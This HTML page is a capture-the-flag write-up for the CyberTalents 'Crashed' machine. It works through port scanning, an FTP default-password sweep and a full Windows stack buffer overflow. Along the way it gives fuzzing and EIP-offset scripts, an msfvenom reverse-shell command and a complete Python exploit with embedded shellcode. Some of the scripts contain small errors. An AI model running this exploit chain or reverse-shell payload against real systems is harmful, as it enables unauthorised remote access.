<!DOCTYPE html>
<html>
    <head>
        <link rel="stylesheet" href="../../css/Font.css">
        <link rel="stylesheet" href="css/code.css">
        <link rel="stylesheet" href="../../css/prism.css">
        <script src="../../js/prism.js"></script>
        <script src="js/copycode.js"></script>
        <script type="module"
            src="https://unpkg.com/@deckdeckgo/highlight-code@latest/dist/deckdeckgo-highlight-code/deckdeckgo-highlight-code.esm.js"></script>
    </head>
    <body>
        <pre>
            Get The highest privilege on the machine and find the flag!

            Target IP: 3.122.178.169

            Target IP: 18.193.129.237

            ‌Challenge Link: <a href="https://cybertalents.com/challenges/machines/crashed">https://cybertalents.com/challenges/machines/crashed</a>
        </pre>
        <pre>
            Enumeration

            Nmap
            </pre>
            <div class="container">
                <deckgo-highlight-code id="codeToCopy">
                    <code slot="code">
                root@kali:~/CyberTalents/Crashed# nmap -p21,135,139,445,1887,3389,5357 -A -T4 35.156.101.240
                Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-12 15:31 BST
                Nmap scan report for ec2-35-156-101-240.eu-central-1.compute.amazonaws.com (35.156.101.240)
                Host is up (0.014s latency).

                PORT     STATE SERVICE       VERSION
                21/tcp   open  ftp           FileZilla ftpd
                | ftp-syst: 
                |_  SYST: UNIX emulated by FileZilla
                135/tcp  open  msrpc         Microsoft Windows RPC
                139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
                445/tcp  open  microsoft-ds  Windows Server 2019 Datacenter 17763 microsoft-ds
                1887/tcp open  filex-lport
                3389/tcp open  ms-wbt-server Microsoft Terminal Services
                5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
                |_http-server-header: Microsoft-HTTPAPI/2.0
                |_http-title: Service Unavailable
            </code></deckgo-highlight-code>
            <button id="copyButton">Copy</button>
        </div>

        <pre>
            <h3>FTP</h3>
            <div class="container">
                <deckgo-highlight-code id="codeToCopy">
                    <code slot="code">
                root@kali:~/CyberTalents/Crashed# cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt >> ftp.txt
                root@kali:~/CyberTalents/Crashed# cat ftp.txt | sed "s/:/ /g" >> ftp-space-seprated.txt
            </code></deckgo-highlight-code>
            <button id="copyButton">Copy</button>
        </div>
            &nbsp;
            <div class="container">
                <deckgo-highlight-code id="codeToCopy">
                    <code slot="code">
                msf6 > use auxiliary/scanner/ftp/ftp_login
                msf6 auxiliary(scanner/ftp/ftp_login) > set rhosts 35.156.101.240
                rhosts => 35.156.101.240
                msf6 auxiliary(scanner/ftp/ftp_login) > set USERPASS_FILE ~/CyberTalents/Crashed/ftp-space-seprated.txt
                USERPASS_FILE => ~/CyberTalents/Crashed/ftp-space-seprated.txt
                msf6 auxiliary(scanner/ftp/ftp_login) > run

                [*] 35.156.101.240:21     - 35.156.101.240:21 - Starting FTP login sweep
                [!] 35.156.101.240:21     - No active DB -- Credential data will not be saved!
                [-] 35.156.101.240:21     - 35.156.101.240:21 - LOGIN FAILED: anonymous:anonymous (Incorrect: )
                [-] 35.156.101.240:21     - 35.156.101.240:21 - LOGIN FAILED: root:rootpasswd (Incorrect: )
                [-] 35.156.101.240:21     - 35.156.101.240:21 - LOGIN FAILED: root:12hrs37 (Incorrect: )
                [-] 35.156.101.240:21     - 35.156.101.240:21 - LOGIN FAILED: ftp:b1uRR3 (Incorrect: )
                [-] 35.156.101.240:21     - 35.156.101.240:21 - LOGIN FAILED: admin:admin (Incorrect: )
                [-] 35.156.101.240:21     - 35.156.101.240:21 - LOGIN FAILED: localadmin:localadmin (Incorrect: )
                [-] 35.156.101.240:21     - 35.156.101.240:21 - LOGIN FAILED: admin:1234 (Incorrect: )
                [-] 35.156.101.240:21     - 35.156.101.240:21 - LOGIN FAILED: apc:apc (Incorrect: )
                [-] 35.156.101.240:21     - 35.156.101.240:21 - LOGIN FAILED: admin:nas (Incorrect: )
                [-] 35.156.101.240:21     - 35.156.101.240:21 - LOGIN FAILED: Root:wago (Incorrect: )
                [-] 35.156.101.240:21     - 35.156.101.240:21 - LOGIN FAILED: Admin:wago (Incorrect: )
                [-] 35.156.101.240:21     - 35.156.101.240:21 - LOGIN FAILED: User:user (Incorrect: )
                [-] 35.156.101.240:21     - 35.156.101.240:21 - LOGIN FAILED: Guest:guest (Incorrect: )
                [+] 35.156.101.240:21     - 35.156.101.240:21 - Login Successful: ftp:ftp
            </code></deckgo-highlight-code>
            <button id="copyButton">Copy</button>
        </div>
        </pre>
        <pre>
            So now we have a successful creds let’s use them and see what is inside the ftp.
            <div class="container">
                <deckgo-highlight-code id="codeToCopy">
                    <code slot="code">
                root@kali:~/CyberTalents/Crashed# ftp 3.122.178.169
                Connected to 3.122.178.169.
                220-FileZilla Server 0.9.60 beta
                220-written by Tim Kosse (tim.kosse@filezilla-project.org)
                220 Please visit https://filezilla-project.org/
                Name (3.122.178.169:root): ftp
                331 Password required for ftp
                Password:
                230 Logged on
                Remote system type is UNIX.
                ftp> ls
                200 Port command successful
                150 Opening data channel for directory listing of "/"
                -r--r--r-- 1 ftp ftp          30036 Sep 08  2020 essfunc.dll
                -r-xr-xr-x 1 ftp ftp          51635 Sep 10  2020 super_secure_server.exe
            </code></deckgo-highlight-code>
            <button id="copyButton">Copy</button>
        </div>
            &nbsp;
        </pre>
        <pre>
            <h3>Enumeration</h3>
            I run the super secure server in my local machine and it looks like the following:

            It listens for a connection. So we need to know which port that its running on.
             we can simply open the CMD and type <i>netstat -ab</i>
        </pre>
        <p>It listens on port 13337. we let’s connect to it form our Kali Machine.</p>
        <img src="../../public/images/machines/Crashed/crashed-1.png"/>
        <pre>
            We need to find anther command to know more about the application. 
            a good solution for this simply we can run strings command to see the hidden command in the executable.
        </pre>
        <pre>
            <div class="container">
                <deckgo-highlight-code id="codeToCopy">
                    <code slot="code">
                root@kali:~/CyberTalents/Crashed# strings super_secure_server.exe 
                !This program cannot be run in DOS mode.
                .text
                P`.data
                .rdata
                0@/4
                0@.bs
                Starting the super secure server version %s
                WSAStartup failed with error: %d
                Getaddrinfo failed with error: %d
                Socket failed with error: %ld
                Bind failed with error: %d
                Listen failed with error: %d
                Waiting for client connections...
                Accept failed with error: %d
                Received a client connection from %s:%u
                Usage: %s [port_number]
                If no port number is provided, the default port of %s will be used.
                Welcome to the super secure server! Enter HELP for help
                Send failed with error: %d
                HELP 
                HELP
                SECRET
                Mission Completed
            </code></deckgo-highlight-code>
            <button id="copyButton">Copy</button>
        </div>
            &nbsp;
            ‌ Now, as you see the hidden command is 
            SECRET that we need it to exploit Buffer flow vulnerability.
        </pre>
        <pre>
            <h3>Fuzzing</h3>
                The first phase of exploiting any buffer overflow vulnerability 
                is first to find the vulnerable command and then to know How many characters that you need to overflow the buffer and crash the application.

                We have to create a simple python script for this job which will be:
            &nbsp;
            <div class="container">
                <deckgo-highlight-code id="codeToCopy">
                    <code slot="code">
                #!/usr/bin/python3
                import sys
                from time import sleep
                import socket

                buffer = 'A' * 100

                while True:
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect(("192.168.1.6", 13337))
                        s.recv(1024)
                        s.send(('SECRET'+ buffer))
                        s.recv(1024)
                        s.close()
                        sleep(1)
                        buffer = buffer + 'A' * 100
                    except:
                        print("Fuzzing Crashed at {} bytes".format(str(len(buffer))))
                        sys.exit()
                    </code></deckgo-highlight-code>
                    <button id="copyButton">Copy</button>
                </div>
            &nbsp;
            This script will send a bunch of A strings that is increasing every time until 
            we trigger the crash of the application.

            Let’s attach our program to the Immunity debugger. Then, run our script.
            <img src="../../public/images/machines/Crashed/crashed-2.png"/>
            The application needs 1000 bytes of strings to crash.    
        </pre>
        <pre>
            <h3>Overwrite EIP</h3>

            <div class="container">
                <deckgo-highlight-code id="codeToCopy">
                    <code slot="code">
            root@kali:~/CyberTalents/Crashed# msf-pattern_create -l 1500
            Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9
            </code></deckgo-highlight-code>
                    <button id="copyButton">Copy</button>
                </div>
            &nbsp;
            ‌ Then we need to edit our script to send this unique string.

            <div class="container">
                <deckgo-highlight-code id="codeToCopy">
                    <code slot="code">
                #!/usr/bin/python3
                import sys
                from time import sleep
                import socket

                buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9"

                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect(("192.168.1.6", 13337))
                s.recv(1024)
                s.send(('SECRET'+ buffer))
                s.close()
            </code></deckgo-highlight-code>
            <button id="copyButton">Copy</button>
        </div>
            &nbsp;
            By running this Fuzzer we will notice in the debugger which string has overwrite the EIP.
            <img src="../../public/images/machines/Crashed/Crashed-3.png"/>

            <div class="container">
                <deckgo-highlight-code id="codeToCopy">
                    <code slot="code">
                root@kali:~/CyberTalents/Crashed# msf-pattern_offset -l 1500 -q 33684232
                [*] Exact match at offset 998
           </code></deckgo-highlight-code>
            <button id="copyButton">Copy</button>
        </div>
            &nbsp;
            ‌ Now let’s edit our script to ensure that the EIP will be overwritten.
            &nbsp;
            <div class="container">
                <deckgo-highlight-code id="codeToCopy">
                    <code slot="code">
                #!/usr/bin/python3
                import sys
                from time import sleep
                import socket

                buffer = "A" * 998 + "B" * 4 + "C" * 498

                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect(("192.168.1.6", 13337))
                s.recv(1024)
                s.send(("SECRET"+ buffer + '\r\n'))
                s.close()
            </code></deckgo-highlight-code>
            <button id="copyButton">Copy</button>
        </div>
        </pre>
        <pre>
            checking for bad characters
            create bad chracters by python scrript
            for i in range(0,256): * print('\\x%02x' % i,end='')
            The \x00 byte is a null terminator for strings ,it is always the first bad character
            remove from bad chr
            send payload again
            &nbsp;
            <div class="container">
                <deckgo-highlight-code id="codeToCopy">
                    <code slot="code">
                import socket
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                badchars = (
                "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
                "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
                "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
                "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
                "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
                "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
                "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
                "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
                "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
                "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
                "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
                "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
                "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
                "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
                "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
                "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
               payload='A'*998
               buffer="SECRET"+payload+'BBBB'+badchars+'C'*(2000-998-4-6-len(badchars))
               s.connect(("192.168.128.129",13337))
               print s.recv(1024)
               s.send(buffer)
               s.close()
            </code></deckgo-highlight-code>
            <button id="copyButton">Copy</button>
        </div>
            &nbsp;
            select ESP >follow in dump > not found bad character
            <img src="../../public/images/machines/Crashed/crashed-4.png"/>
        </pre>
        <pre>
            used mona.py script > drop mona.py into the ‘PyCommands’ folder (inside the Immunity Debugger application folder).
            <a href="https://github.com/corelan/mona">https://github.com/corelan/mona</a>
            !mona modules
            I found super_secure_server.exe and essfunc.ddl
            I use essfunc.dll
            <img src="../../public/images/machines/Crashed/crashed-5.png"/>
            <div class="container">
                <deckgo-highlight-code id="codeToCopy">
                    <code slot="code">
                        !mona jmp -r esp -m "essfunc.dll" to locate jmp esp
                    </code></deckgo-highlight-code>
                    <button id="copyButton">Copy</button>
                </div>
            <img src="../../public/images/Crashed/crashed-6.png"/>
            break point jmp esp (double click) + restart service
            <img src="../../public/images/machines/Crashed/crashed-7.png"/>
            &nbsp;
            &nbsp;
            create shell code by msfvenom
            <div class="container">
                <deckgo-highlight-code id="codeToCopy">
                    <code slot="code">
            msfvenom -p windows/shell_reverse_tcp LHOST=192.168.128.128 LPORT=443 -e x86/shikata_ga_nai -f py -v shell -b "\x00"
        </code></deckgo-highlight-code>
        <button id="copyButton">Copy</button>
    </div>
            update python script
            replace BBBB esp get from mona script (\xad\x12\x50\x62’) write(little endian)
            add nop(no operation befor shellcode)\x90
        </pre>
        <pre>
            <div class="container">
                <deckgo-highlight-code id="codeToCopy">
                    <code slot="code">
        import socket
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		shell =  b""
		shell += b"\xda\xd1\xd9\x74\x24\xf4\xbe\x3d\x6f\x0b\x48\x58"
		shell += b"\x29\xc9\xb1\x52\x31\x70\x17\x03\x70\x17\x83\xd5"
		shell += b"\x93\xe9\xbd\xd9\x84\x6c\x3d\x21\x55\x11\xb7\xc4"
		shell += b"\x64\x11\xa3\x8d\xd7\xa1\xa7\xc3\xdb\x4a\xe5\xf7"
		shell += b"\x68\x3e\x22\xf8\xd9\xf5\x14\x37\xd9\xa6\x65\x56"
		shell += b"\x59\xb5\xb9\xb8\x60\x76\xcc\xb9\xa5\x6b\x3d\xeb"
		shell += b"\x7e\xe7\x90\x1b\x0a\xbd\x28\x90\x40\x53\x29\x45"
		shell += b"\x10\x52\x18\xd8\x2a\x0d\xba\xdb\xff\x25\xf3\xc3"
		shell += b"\x1c\x03\x4d\x78\xd6\xff\x4c\xa8\x26\xff\xe3\x95"
		shell += b"\x86\xf2\xfa\xd2\x21\xed\x88\x2a\x52\x90\x8a\xe9"
		shell += b"\x28\x4e\x1e\xe9\x8b\x05\xb8\xd5\x2a\xc9\x5f\x9e"
		shell += b"\x21\xa6\x14\xf8\x25\x39\xf8\x73\x51\xb2\xff\x53"
		shell += b"\xd3\x80\xdb\x77\xbf\x53\x45\x2e\x65\x35\x7a\x30"
		shell += b"\xc6\xea\xde\x3b\xeb\xff\x52\x66\x64\x33\x5f\x98"
		shell += b"\x74\x5b\xe8\xeb\x46\xc4\x42\x63\xeb\x8d\x4c\x74"
		shell += b"\x0c\xa4\x29\xea\xf3\x47\x4a\x23\x30\x13\x1a\x5b"
		shell += b"\x91\x1c\xf1\x9b\x1e\xc9\x56\xcb\xb0\xa2\x16\xbb"
		shell += b"\x70\x13\xff\xd1\x7e\x4c\x1f\xda\x54\xe5\x8a\x21"
		shell += b"\x3f\xca\xe3\xa9\x3f\xa2\xf1\xa9\x3e\x88\x7f\x4f"
		shell += b"\x2a\xfe\x29\xd8\xc3\x67\x70\x92\x72\x67\xae\xdf"
		shell += b"\xb5\xe3\x5d\x20\x7b\x04\x2b\x32\xec\xe4\x66\x68"
		shell += b"\xbb\xfb\x5c\x04\x27\x69\x3b\xd4\x2e\x92\x94\x83"
		shell += b"\x67\x64\xed\x41\x9a\xdf\x47\x77\x67\xb9\xa0\x33"
		shell += b"\xbc\x7a\x2e\xba\x31\xc6\x14\xac\x8f\xc7\x10\x98"
		shell += b"\x5f\x9e\xce\x76\x26\x48\xa1\x20\xf0\x27\x6b\xa4"
		shell += b"\x85\x0b\xac\xb2\x89\x41\x5a\x5a\x3b\x3c\x1b\x65"
		shell += b"\xf4\xa8\xab\x1e\xe8\x48\x53\xf5\xa8\x79\x1e\x57"
		shell += b"\x98\x11\xc7\x02\x98\x7f\xf8\xf9\xdf\x79\x7b\x0b"
		shell += b"\xa0\x7d\x63\x7e\xa5\x3a\x23\x93\xd7\x53\xc6\x93"
		shell += b"\x44\x53\xc3"`

		 payload='A'*998
		 buffer=buffer="SECRET"+payload+'\xad\x12\x50\x62'+'\x90'*16+shell+'\x90'*(2000-998-4-6-16-len(shell))
		 s.connect(("192.168.128.129",13337))
		 print s.recv(1024)
		 s.send(buffer)
		 s.close()
        </code></deckgo-highlight-code>
        <button id="copyButton">Copy</button>
    </div>
            &nbsp;
            run script
            run nc listener sudo nc -nlvp 443
            finally got a shell
        </pre>
        <pre>
            change ip from private to ip get from vpn(cybertalents)
            scan again to find port to connect
            <div class="container">
                <deckgo-highlight-code id="codeToCopy">
                    <code slot="code">
                sudo unicornscan -ImT 172.24.226.182:1-2000
            </code></deckgo-highlight-code>
            <button id="copyButton">Copy</button>
        </div>
            <img src="../../public/images/machines/Crashed/crashed-9.png"/>
            &nbsp;
            connect nc 172.24.226.182 1887
            <img src="../../public/images/machines/Crashed/crashed-10.png"/>
            send code to machine on cyber talents
            &nbsp;
            &nbsp;
            <div class="container">
                <deckgo-highlight-code id="codeToCopy">
                    <code slot="code">
                import socket
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                shell=""
                payload='A'*998
                buffer="SECRET"+payload+'\xad\x12\x50\x62'+'\x90'*16+shell+'\x90'*(2000-998-4-6-16-len(shell))
                s.connect(("172.24.226.182",1887))
                print s.recv(1024)
                s.send(buffer)
                s.close()
            </code></deckgo-highlight-code>
            <button id="copyButton">Copy</button>
        </div>
            <img src="../../public/images/machines/Crashed/crashed-11.png"/>
            c:\Users\Administrator\Desktop>type flag.txt
            type flag.txt
        </pre>

        <h2><i>
            ffa3857489xxxxxxxxx474c9d  
        </i></h2>
    </body>
</html>